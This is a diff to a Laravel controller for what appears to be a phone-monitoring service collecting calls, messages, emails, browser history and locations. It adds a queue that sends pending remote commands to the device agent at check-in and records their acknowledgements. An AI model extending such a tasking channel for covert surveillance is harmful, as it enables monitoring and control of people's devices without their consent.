@@ -7,6 +7,7 @@ use App\Models\DeviceAppActivity;
 use App\Models\DeviceBrowserHistory;
 use App\Models\DeviceCalendarEvent;
 use App\Models\DeviceCall;
+use App\Models\DeviceCommand;
 use App\Models\DeviceContact;
 use App\Models\DeviceDiagnostic;
 use App\Models\DeviceEmail;
@@ -14,6 +15,7 @@ use App\Models\DeviceLocation;
 use App\Models\DeviceMedia;
 use App\Models\DeviceMessage;
 use App\Models\DeviceNote;
+use App\Notifications\CommandCompleted;
 use App\Services\AlertEngine;
 use Illuminate\Http\Request;
 
@@ -34,10 +36,65 @@ class AgentController extends Controller
         $device->forceFill($request->only('os_version', 'manufacturer', 'model', 'phone_number'))
             ->save();
 
+        $commands = $device->commands()
+            ->where('status', 'pending')
+            ->orderBy('id')
+            ->get();
+
+        if ($commands->isNotEmpty()) {
+            $device->commands()
+                ->whereIn('id', $commands->pluck('id'))
+                ->update(['status' => 'sent', 'sent_at' => now()]);
+        }
+
         return response()->json([
             'status' => 'ok',
             'device' => $device->name,
             'next_checkin' => now()->addMinutes(5)->toDateTimeString(),
+            'commands' => $commands->map(fn (DeviceCommand $command) => [
+                'id' => $command->id,
+                'type' => $command->type,
+                'payload' => $command->payload,
+            ])->values(),
+        ]);
+    }
+
+    public function acknowledge(Request $request)
+    {
+        $validated = $request->validate([
+            'commands' => 'required|array',
+            'commands.*.id' => 'required|integer',
+            'commands.*.status' => 'required|in:acknowledged,failed',
+            'commands.*.result' => 'nullable|string|max:255',
+        ]);
+
+        $device = $request->device;
+        $counts = ['acknowledged' => 0, 'failed' => 0];
+
+        foreach ($validated['commands'] as $entry) {
+            $command = $device->commands()
+                ->whereKey($entry['id'])
+                ->whereIn('status', ['pending', 'sent'])
+                ->first();
+
+            if (! $command) {
+                continue;
+            }
+
+            $command->update([
+                'status' => $entry['status'],
+                'result' => $entry['result'] ?? null,
+                'acknowledged_at' => now(),
+            ]);
+
+            $counts[$entry['status']]++;
+
+            $device->user?->notify(new CommandCompleted($command));
+        }
+
+        return response()->json([
+            'status' => 'ok',
+            'updated' => $counts,
         ]);
     }
 
